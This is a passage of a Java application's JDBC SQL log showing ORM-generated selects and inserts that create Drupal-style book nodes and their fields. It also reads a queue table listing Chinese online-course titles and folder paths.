as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=1 
 {executed in 0 msec}
2020-11-19 10:53:47.083 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|1         |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:53:47.090 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.091 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |1           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:53:47.097 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.098 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:53:47.103 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 1, 1) 
 {executed in 1 msec}
2020-11-19 10:53:47.111 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=1 
 {executed in 1 msec}
2020-11-19 10:53:47.112 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:53:47.113 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 1, 1) 
 {executed in 0 msec}
2020-11-19 10:53:48.738 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='568347143558516' 
 {executed in 1 msec}
2020-11-19 10:53:48.739 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:53:48.765 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754428, 1) 
 {executed in 5 msec}
2020-11-19 10:53:48.766 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754428, 1) 
 {executed in 0 msec}
2020-11-19 10:53:48.768 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|2             |
|--------------|

2020-11-19 10:53:48.777 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'd915ec1c-b08c-4c6a-ae15-dd21d3de8ea1', 
2) 
 {executed in 1 msec}
2020-11-19 10:53:48.777 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'd915ec1c-b08c-4c6a-ae15-dd21d3de8ea1', 2) 
 {executed in 0 msec}
2020-11-19 10:53:48.778 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|2             |
|--------------|

2020-11-19 10:53:48.782 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=2, revision_default=1, revision_timestamp=1605754428, 
revision_uid=1 where vid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.785 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.786 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:53:48.788 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '568347143558516', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.794 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:53:48.794 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:53:48.796 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '568347143558516', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.800 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.801 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:53:48.802 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.802 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:53:48.804 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
2, 1, 1, 2, 0, 0, 0, 1, 0, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.811 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.811 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:53:48.812 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.812 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:53:48.814 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.821 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.821 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:53:48.823 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.830 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.831 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 10:53:48.832 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.832 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 10:53:48.834 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754428, 1605754428, 1, 'zh-hans', 0, 1, 1, 
0, '07丨全栈回顾 (1讲)', 1, 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.841 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:53:48.841 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 10:53:48.842 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754428, 1605754428, 1, 'zh-hans', 0, 
1, 1, 0, '07丨全栈回顾 (1讲)', 'book', 1, 2, 2) 
 {executed in 0 msec}
2020-11-19 10:53:48.847 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.847 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:53:48.848 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.848 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:53:48.850 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', '', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.855 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:53:48.855 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:53:48.857 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', '', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.862 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.862 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:53:48.863 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.863 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:53:48.865 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.870 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.870 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:53:48.872 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.877 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:53:48.877 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:53:48.878 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.879 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:53:48.880 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 2, '', 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.885 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.885 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:53:48.887 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 2, '', 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.893 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:53:48.893 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:53:48.895 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 2, 2) 
 {executed in 1 msec}
2020-11-19 10:53:48.899 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:53:48.899 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:53:48.900 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 2, 2) 
 {executed in 0 msec}
2020-11-19 10:54:55.983 INFO  jdbc.sqltiming Line:373 - select queueentit0_.item_id as item_id1_18_, queueentit0_.base_path as base_pat2_18_, queueentit0_.name 
as name3_18_, queueentit0_.todo as todo4_18_ from queue_new queueentit0_ where queueentit0_.todo=1 
 {executed in 0 msec}
2020-11-19 10:54:55.985 INFO  jdbc.resultsettable Line:610 - 
|-----------------|-------------------------------|--------------------|-----|
|item_id          |base_path                      |name                |todo |
|-----------------|-------------------------------|--------------------|-----|
|283828550600385  |00-资源文件/14-极客时间/01-专栏课/051-99/ |87-全栈工程师修炼指南        |1    |
|300655922831157  |00-资源文件/14-极客时间/01-专栏课/051-99/ |52-透视HTTP协议         |1    |
|390535478164697  |00-资源文件/14-极客时间/01-专栏课/051-99/ |51-白话法律42讲          |1    |
|409602706903658  |00-资源文件/14-极客时间/01-专栏课/051-99/ |77-从0打造音视频直播系统      |1    |
|459081746926346  |00-资源文件/14-极客时间/01-专栏课/051-99/ |99-JavaScript核心原理解析 |1    |
|476330106989327  |00-资源文件/14-极客时间/01-专栏课/051-99/ |88-高并发系统设计40问       |1    |
|621195835058382  |00-资源文件/14-极客时间/01-专栏课/051-99/ |97-项目管理实战20讲        |1    |
|626896109933850  |00-资源文件/14-极客时间/01-专栏课/051-99/ |98-设计模式之美           |1    |
|773737007105338  |00-资源文件/14-极客时间/01-专栏课/051-99/ |53-OpenResty从入门到实战  |1    |
|781941951179116  |00-资源文件/14-极客时间/01-专栏课/051-99/ |75-编辑训练营            |1    |
|787964344536295  |00-资源文件/14-极客时间/01-专栏课/051-99/ |80-网络编程实战           |1    |
|789557280998655  |00-资源文件/14-极客时间/01-专栏课/051-99/ |86-即时消息技术剖析与实战      |1    |
|823812106395779  |00-资源文件/14-极客时间/01-专栏课/051-99/ |74-Flutter核心技术与实战   |1    |
|855137735533744  |00-资源文件/14-极客时间/01-专栏课/051-99/ |94-DDD实战课           |1    |
|861073733380654  |00-资源文件/14-极客时间/01-专栏课/051-99/ |90-分布式技术原理与算法解析     |1    |
|876595205877896  |00-资源文件/14-极客时间/01-专栏课/051-99/ |91-说透中台             |1    |
|877479874575179  |00-资源文件/14-极客时间/01-专栏课/051-99/ |83-编译原理之美           |1    |
|936433950782588  |00-资源文件/14-极客时间/01-专栏课/051-99/ |95-苏杰的产品创新课         |1    |
|952316731239648  |00-资源文件/14-极客时间/01-专栏课/051-99/ |92-DevOps实战笔记       |1    |
|954967934009220  |00-资源文件/14-极客时间/01-专栏课/051-99/ |73-黄勇的OKR实战笔记       |1    |
|1004252009859251 |00-资源文件/14-极客时间/01-专栏课/051-99/ |85-研发效率破局之道         |1    |
|1009872364102685 |00-资源文件/14-极客时间/01-专栏课/051-99/ |81-浏览器工作原理与实践       |1    |
|1022101157981678 |00-资源文件/14-极客时间/01-专栏课/051-99/ |79-消息队列高手课          |1    |
|-----------------|-------------------------------|--------------------|-----|

2020-11-19 10:54:55.986 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='283828550600385' 
 {executed in 0 msec}
2020-11-19 10:54:55.986 INFO  jdbc.resultsettable Line:610 - 
